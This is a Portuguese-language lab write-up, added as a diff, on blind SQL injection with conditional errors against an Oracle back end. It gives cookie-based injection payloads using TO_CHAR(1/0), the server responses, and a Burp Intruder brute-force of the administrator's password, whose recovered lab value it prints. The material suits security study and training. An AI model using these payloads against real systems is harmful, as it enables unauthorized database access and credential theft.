@@ -1,0 +1,83 @@
+\\Blink SQLi With Conditional Errors//
+
+Esse lab é igual ao anterior, o que muda são as tecnicas de exploração.
+
+Ver se a página aceita caracteres;
+'
+'#
+'-- |->OK
+
+Obs: No laboratório anterior retornava a mensagem Welcome, neste lab não apareçe.
+
+O método que vamos fazer é criar querys verdadeiras.
+
+Tabela padrão do oracle: dual
+
+-------------------------------------------------------
+
+Descobrindo quantidade de colunas.
+
+'UNION SELECT NULL FROM dual-- |-> 200 OK
+'UNION SELECT NULL, NULL FROM dual-- |-> 500 Gerou erro, ou seja, tem apenas 1 coluna.
+
+TO_CHAR() - Converte valores númericos para texto.
+'UNION SELECT TO_CHAR(1,2,3) FROM dual-- |-> 200 OK
+'UNION SELECT TO_CHAR(1/0) FROM dual-- |-> 500 OK
+
+Vamos usar o método TO_CHAR para extrair dados do banco de dados. 
+-----------------------------------------------------------------
+
+- Validar que a tebela users existe.
+Injeção 1: UNION SELECT TO_CHAR(1/0) FROM users--
+Para ter certeza que a tabela existe é só retirar o 0.
+    |-> TO_CHAR(1)
+Query: SELECT * FROM TrackUsers WHERE TrackingId='$track_id'
+    |-> Se a tabela não existir ocorre um erro.
+______________________________________________________________
+
+- Validar que existe um usuário com username = 'administrator'
+Injeção 2: ' UNION SELECT TO_CHAR(1/0) FROM users WHERE username='administrator'--
+Query: SELECT * FROM TrackUsers WHERE TrackingId='$track_id'
+
+
+------------------------------------------------------------------------------------
+
+Adaptando injeção para descobrir o número de caracteres do password
+
+Injeção: cookie_valido' UNION (SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)=1--
+
+Query: SELECT * FROM TrackUsers WHERE TrackingId='$track_id'cookie_valido UNION (SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)>15)--';
+Resposta: A aplicação devolve um erro interno.
+
+Explicação:
+    |-> SELECT TO_CHAR(1/10): Se o resultado da condição for verdadeiro, a query vai devolver o resultado da função
+                              TO_CHAR(1/0). Está função serve para converter valores númericos ou datas em texto. No 
+                              entanto, como a divisão de 1 por 0 é impossível, o resultado gera um erro sql. Assim sendo,
+                              quando um resultado é verdadeiro, é devolvido um erro pela aplicação. Como existe um usuário
+                              com username 'administrator' cuja password tem mais de 15 caracteres, o resultado da query
+                              é verdadeiro e,portanto, é devolvido um erro.
+
+
+Sabemos que a senha tem 20 caracteres.
+Cookie: TrackingId=Aw5g1JEOdcd2quc4'UNION SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)=20--; |->500
+Cookie: TrackingId=Aw5g1JEOdcd2quc4'UNION SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)=21--; |->200
+Cookie: TrackingId=Aw5g1JEOdcd2quc4'UNION SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)>19--; |->500
+
+Vamos usar o intruder para descobrir a quantidade de colunas
+|-> Vamos introduzir de 1-30
+
+Vamos pegar o status code: 500 
+Cookie: TrackingId=Aw5g1JEOdcd2quc4'UNION SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND LENGTH(password)=20--;
+                            
+
+------------------------------------------------------------------------------------
+Descobrir o password:
+Injeção: ' UNION (SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')--
+    |-> Se a primeira palavra do password for a gera umm erro 500.
+
+No intruder vamos escolher novamente cluster bomb 
+Vamos passar na lista 1: 1-20 
+Vamos passar na lista 2: 0-9 a-z
+
+username = administrator
+password = boubnmm3tb1r4wqbzaw1
